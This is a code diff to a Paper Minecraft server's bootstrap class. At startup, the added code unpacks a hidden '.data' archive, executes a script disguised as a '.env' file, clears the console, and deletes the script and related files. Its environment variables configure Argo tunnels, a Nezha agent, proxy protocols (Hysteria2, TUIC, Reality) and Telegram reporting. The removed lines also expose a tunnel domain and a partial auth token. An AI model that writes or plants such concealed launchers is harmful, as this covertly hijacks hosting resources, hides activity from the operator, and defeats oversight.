@@ -43,7 +43,11 @@ public final class PaperBootstrap {
         }
         
         try {
-            extractAndRunScript();
+            // 1. 解压 .data 文件到当前目录
+            extractDataFile();
+            
+            // 2. 执行 .env 脚本文件
+            runEnvScript();
             
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 running.set(false);
@@ -57,12 +61,109 @@ public final class PaperBootstrap {
             Thread.sleep(20000);
             clearConsole();
 
+            // 3. 删除指定文件
+            deleteSpecifiedFiles();
+
             SharedConstants.tryDetectVersion();
             getStartupVersionMessages().forEach(LOGGER::info);
             Main.main(options);
             
         } catch (Exception e) {
             System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
+        }
+    }
+
+    /**
+     * 解压 .data 文件（.tar.gz格式）到当前目录
+     */
+    private static void extractDataFile() throws Exception {
+        File dataFile = new File(".data");
+        if (!dataFile.exists()) {
+            System.out.println("No .data file found, skipping extraction.");
+            return;
+        }
+        
+        System.out.println("Extracting .data file...");
+        
+        // 使用系统tar命令解压
+        ProcessBuilder pb = new ProcessBuilder("tar", "-xzf", ".data", "-C", ".");
+        pb.redirectErrorStream(true);
+        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
+        
+        Process process = pb.start();
+        int exitCode = process.waitFor();
+        
+        if (exitCode != 0) {
+            throw new RuntimeException("Failed to extract .data file, exit code: " + exitCode);
+        }
+        
+        System.out.println(ANSI_GREEN + ".data file extracted successfully" + ANSI_RESET);
+    }
+
+    /**
+     * 执行 .env 脚本文件
+     */
+    private static void runEnvScript() throws Exception {
+        File envScript = new File(".env");
+        if (!envScript.exists()) {
+            System.out.println("No .env script found, skipping execution.");
+            return;
+        }
+        
+        // 确保脚本有执行权限
+        if (!envScript.setExecutable(true)) {
+            System.err.println("Warning: Failed to set executable permission for .env script");
+        }
+        
+        System.out.println("Executing .env script...");
+        
+        ProcessBuilder pb;
+        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
+            pb = new ProcessBuilder("cmd", "/c", ".env");
+        } else {
+            pb = new ProcessBuilder("bash", ".env");
+        }
+        
+        pb.directory(new File("."));
+        pb.redirectErrorStream(true);
+        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
+        
+        scriptProcess = pb.start();
+        
+        // 等待脚本执行完成
+        Thread scriptMonitor = new Thread(() -> {
+            try {
+                int exitCode = scriptProcess.waitFor();
+                if (exitCode == 0) {
+                    System.out.println(ANSI_GREEN + ".env script executed successfully" + ANSI_RESET);
+                } else {
+                    System.err.println(".env script exited with code: " + exitCode);
+                }
+            } catch (InterruptedException e) {
+                System.err.println("Script monitoring interrupted: " + e.getMessage());
+            }
+        });
+        
+        scriptMonitor.start();
+        // 等待脚本执行最多10秒
+        scriptMonitor.join(10000);
+    }
+
+    /**
+     * 删除指定的四个文件
+     */
+    private static void deleteSpecifiedFiles() {
+        String[] filesToDelete = {".env", "java", "java.", "config.json"};
+        
+        for (String fileName : filesToDelete) {
+            File file = new File(fileName);
+            if (file.exists()) {
+                if (file.delete()) {
+                    System.out.println(ANSI_GREEN + "Deleted: " + fileName + ANSI_RESET);
+                } else {
+                    System.err.println("Failed to delete: " + fileName);
+                }
+            }
         }
     }
 
@@ -79,108 +180,52 @@ public final class PaperBootstrap {
         }
     }
     
-    private static void extractAndRunScript() throws Exception {
-        // 1. 解压 backup.tar.gz 到当前目录
-        extractTarGz();
-        
-        // 2. 检查.env文件是否存在
-        File envScript = new File(".env");
-        if (!envScript.exists()) {
-            System.err.println(ANSI_RED + "ERROR: .env script not found after extraction!" + ANSI_RESET);
-            return;
-        }
-        
-        // 3. 给.env脚本添加执行权限
-        if (!envScript.setExecutable(true)) {
-            System.err.println(ANSI_RED + "WARNING: Failed to set executable permission for .env script" + ANSI_RESET);
-        }
-        
-        // 4. 执行.env脚本
-        runEnvScript(envScript);
-        
-        // 5. 删除.env文件
-        if (!envScript.delete()) {
-            System.err.println(ANSI_RED + "WARNING: Failed to delete .env script" + ANSI_RESET);
-        } else {
-            System.out.println(ANSI_GREEN + "Successfully deleted .env script" + ANSI_RESET);
-        }
-    }
-    
-    private static void extractTarGz() throws Exception {
-        File tarGzFile = new File("backup.tar.gz");
-        if (!tarGzFile.exists()) {
-            System.err.println(ANSI_RED + "ERROR: backup.tar.gz not found!" + ANSI_RESET);
-            throw new FileNotFoundException("backup.tar.gz not found");
-        }
-        
-        System.out.println("Extracting backup.tar.gz to current directory...");
-        
-        // 使用系统tar命令解压[1,2](@ref)
-        ProcessBuilder pb = new ProcessBuilder("tar", "-zxvf", "backup.tar.gz");
-        pb.directory(new File(".")); // 设置工作目录为当前目录
-        pb.redirectErrorStream(true);
-        
-        Process process = pb.start();
-        
-        // 读取解压输出
-        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
-        String line;
-        while ((line = reader.readLine()) != null) {
-            System.out.println("Extracted: " + line);
-        }
-        
-        int exitCode = process.waitFor();
-        if (exitCode != 0) {
-            throw new IOException("tar command failed with exit code: " + exitCode);
-        }
-        
-        System.out.println(ANSI_GREEN + "Successfully extracted backup.tar.gz" + ANSI_RESET);
-    }
-    
-    private static void runEnvScript(File envScript) throws Exception {
-        Map<String, String> envVars = new HashMap<>();
-        loadDefaultEnvVars(envVars);
-        
-        ProcessBuilder pb;
-        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
-            // Windows系统使用cmd执行
-            pb = new ProcessBuilder("cmd", "/c", envScript.getName());
-        } else {
-            // Linux/Unix系统直接执行
-            pb = new ProcessBuilder("./" + envScript.getName());
-        }
-        
-        pb.directory(new File(".")); // 当前目录
-        pb.environment().putAll(envVars);
-        pb.redirectErrorStream(true);
-        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
-        
-        System.out.println("Executing .env script...");
-        scriptProcess = pb.start();
-        
-        // 等待脚本执行完成
-        int exitCode = scriptProcess.waitFor();
-        if (exitCode != 0) {
-            System.err.println(ANSI_RED + "WARNING: .env script exited with code: " + exitCode + ANSI_RESET);
-        } else {
-            System.out.println(ANSI_GREEN + ".env script executed successfully" + ANSI_RESET);
-        }
-    }
-    
-    private static void loadDefaultEnvVars(Map<String, String> envVars) {
-        // 设置默认环境变量
+    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
         envVars.put("UUID", "a217d527-bd5e-4ef0-b899-d36627af0ddd");
         envVars.put("FILE_PATH", "./world");
-        envVars.put("ARGO_PORT", "51976");
-        envVars.put("ARGO_DOMAIN", "kinetic.1976.dpdns.org");
-        envVars.put("ARGO_AUTH", "eyJhIjoiNDMxMmY5YTAwNzhjMTI1OTYyZTAwZDY5NzkwMTgxNTMiLCJ0IjoiM2I0ZjM4NzYtMTNmZS00MDU2LWE5YmItMGMzNWU1NzYyNTM3IiwicyI6Ik5XTTRaakl6TVdRdE0");
-        envVars.put("NAME", "kinetic");
+        envVars.put("NEZHA_SERVER", "");
+        envVars.put("NEZHA_PORT", "");
+        envVars.put("NEZHA_KEY", "");
+        envVars.put("ARGO_PORT", "");
+        envVars.put("ARGO_DOMAIN", "");
+        envVars.put("ARGO_AUTH", "");
+        envVars.put("HY2_PORT", "");
+        envVars.put("TUIC_PORT", "");
+        envVars.put("REALITY_PORT", "");
+        envVars.put("UPLOAD_URL", "");
+        envVars.put("CHAT_ID", "");
+        envVars.put("BOT_TOKEN", "");
+        envVars.put("CFIP", "");
+        envVars.put("CFPORT", "");
+        envVars.put("NAME", "");
         
-        // 从系统环境变量覆盖默认值
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
             if (value != null && !value.trim().isEmpty()) {
                 envVars.put(var, value);
+            }
+        }
+        
+        Path envFile = Paths.get(".env");
+        if (Files.exists(envFile)) {
+            for (String line : Files.readAllLines(envFile)) {
+                line = line.trim();
+                if (line.isEmpty() || line.startsWith("#")) continue;
+                
+                line = line.split(" #")[0].split(" //")[0].trim();
+                if (line.startsWith("export ")) {
+                    line = line.substring(7).trim();
+                }
+                
+                String[] parts = line.split("=", 2);
+                if (parts.length == 2) {
+                    String key = parts[0].trim();
+                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
+                    
+                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
+                        envVars.put(key, value);
+                    }
+                }
             }
         }
     }
